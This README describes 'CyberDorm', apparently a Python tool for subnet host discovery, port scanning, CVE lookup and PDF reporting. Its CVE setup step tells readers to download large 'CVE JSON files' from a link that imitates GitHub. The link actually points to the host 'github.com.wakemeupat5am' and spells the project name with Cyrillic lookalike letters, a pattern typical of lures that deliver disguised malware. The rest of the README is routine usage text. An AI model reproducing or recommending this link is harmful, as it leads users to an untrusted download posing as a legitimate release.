# CyberDorm — Network Vulnerability Scanner

CyberDorm is a Python-based network scanning tool designed to enumerate hosts in a subnet, perform port scanning, and identify known vulnerabilities using a local CVE database.

## Features

- Subnet host enumeration via ICMP ping.
- TCP port scanning with different profiles (fast, audit, forensic).
- Service and version detection.
- CVE lookup against a local JSON database.
- PDF report generation with vulnerabilities highlighted by severity.

## Requirements

- Python 3.13+
- Pip (Python package manager)
- Dependencies listed in `requirements.txt`:
  ```bash
  pip install -r requirements.txt
  ```

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/YOUR_USERNAME/CyberDorm.git
   cd CyberDorm
   ```
2. (Optional) Create a virtual environment:
   ```bash
   python3 -m venv .venv
   source .venv/bin/activate
   pip install -r requirements.txt
   ```

## CVE Database Setup

The tool requires a local CVE database to identify vulnerabilities. These files are large and are provided separately in the [Releases](https://github.com.wakemeupat5am/сyberвorm/releases).

1. Download the ALL CVE JSON files from the latest release.
2. Place all JSON files into the `CVE/` directory in the project root.
   ```
   CyberDorm/
   ├─ core/
   ├─ CVE/
   │   ├─ 2026.json
   │   ├─ 2025.json
   │   └─ ...
   ├─ main.py
   └─ requirements.txt
   ```

## Usage

### Basic Scan

```bash
python main.py -t 192.168.0.0/24 -p fast -i 3
```
- `-t` / `--target`: Target IP or subnet (e.g., `192.168.1.1` or `192.168.0.0/24`).
- `-p` / `--profile`: Scan profile: `fast`, `audit`, or `forensic`. Default: `fast`.
- `-i` / `--intensity`: Scan intensity from 1 to 5. Default: `3`.

### Output
- Scan results are printed to the console.
- Vulnerabilities are checked against the CVE database.
- PDF reports are generated in the `results/` folder with detailed host and vulnerability info.

## Directory Structure

```
CyberDorm/
├─ core/              # Core modules (network scanning, port enumeration, CVE engine, PDF engine)
├─ CVE/               # Local CVE JSON database (download from Releases)
├─ results/           # PDF reports and scan outputs (generated locally)
├─ main.py            # Entry point
└─ requirements.txt   # Python dependencies
```

## Notes

- Large files like CVE JSON and PDF reports are **not included in the repository**. Download CVE JSON files from the Releases page.
- Ensure Python 3.13+ is installed.
- Scans may require proper permissions (some ICMP or port scans may need root/admin privileges).

## License

[MIT License](LICENSE)

---

CyberDorm — safe, local network scanning and CVE analysis tool for research and testing purposes only. Use responsibly.

